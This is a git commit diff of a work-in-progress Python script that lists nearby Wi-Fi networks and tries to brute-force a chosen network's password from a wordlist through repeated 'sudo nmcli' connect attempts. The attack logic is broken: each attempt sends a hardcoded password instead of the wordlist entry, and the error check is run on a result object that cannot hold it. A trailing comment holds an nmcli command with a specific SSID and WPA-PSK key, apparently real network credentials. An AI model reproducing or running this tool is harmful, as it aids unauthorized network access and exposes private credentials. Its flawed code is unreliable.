64a705fdaecc8aaccaec314a6e38d0728c524da3
wordhater <ryanlocke058@gmail.com>
2023-12-01 17:11:41 +1000

    almost have connection working

--- src/main.py
+++ src/main.py
@@ -1,4 +1,6 @@
 import subprocess
+from time import sleep
+import os
 ##### VARS #####
 ssid_list = []
 security_list = []
@@ -27,19 +29,28 @@ def bruteforce(ssid, password=""):
     if password == "":
         with open('resources/passwordlist.txt', 'r') as f:
             codes = f.read().split('\n')
-        print(codes)
         correct = False
         correct_code = ""
-        for i in range(len(codes)):
-            try:
-                
-            except:
-                print("erreor occured in bruteforcing")
-            finally:
-                print("ending bruteforce")
-                if correct:
-                    print(correct_code)
-
+        try:
+            for i in range(len(codes)):
+                try:
+                    result = subprocess.run(["sudo", "nmcli", "dev", "wifi", "connect", ssid, "password", "38969973"], stdout=subprocess.PIPE)
+                    print(result)
+                    if ("Error:" in result):
+                        print(f"password {i} is incorrect")
+                    else:
+                        correct = True
+                        correct_code = codes[i]
+                        print(f"The password of {ssid} is {correct_code}")
+                        break
+                except:
+                    print("erre")
+        except:
+            print("Error occured in bruteforcing")
+        finally:
+            print("Ending bruteforce")
+            if correct:
+                print(f"The password of {ssid} is {correct_code}")
 
 print("STARTED")
 
@@ -47,5 +58,6 @@ find_networks()
 print("enter the number following the network ssid to select")
 for i in range(len(ssid_list)):
     print(f"> {ssid_list[i]} < ({i})")
-selected_network = input("Enter number here: ")
-
+selected_network = int(input("Enter number here: "))
+bruteforce(ssid_list[selected_network])
+# nmcli connection add type wifi ifname wlp2s0 ssid H con-name PRATAP2 +802-11-wireless-security.key-mgmt WPA-PSK +802-11-wireless-security.psk 50251919
